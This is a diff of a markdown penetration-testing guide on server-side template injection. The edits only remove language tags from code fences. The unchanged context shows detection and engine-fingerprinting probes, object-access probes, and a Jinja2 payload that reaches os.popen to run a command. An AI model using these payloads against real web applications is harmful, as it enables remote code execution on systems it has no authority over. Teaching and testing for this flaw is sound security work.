@@ -62,7 +62,7 @@ Indicators of SSTI include:
 
 Test with simple arithmetic expressions:
 
-```text
+```
 ${7*7}
 {{7*7}}
 <%= 7*7 %>
@@ -98,7 +98,7 @@ Once SSTI is verified, identifying the specific **template engine** is crucial f
 
 Inject malformed expressions:
 
-```text
+```
 ${}
 {{}}
 <%= %>
@@ -124,7 +124,7 @@ Error messages or stack traces may reveal the engine name (e.g., Jinja2, Twig, F
 
 If no explicit error message appears, test common syntaxes for popular engines:
 
-```text
+```
 =${7*3}
 ={{7*3}}
 =<%= 7*3 %>
@@ -156,7 +156,7 @@ Study engine-specific documentation or resources like **HackTricks** to identify
 
 Attempt to access key objects:
 
-```jinja2
+```
 {{ self }}
 {{ request }}
 {{ session }}
@@ -178,7 +178,7 @@ Once internal objects are accessible, escalate to RCE or file access.
 
 **Example (Jinja2):**
 
-```jinja2
+```
 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
 
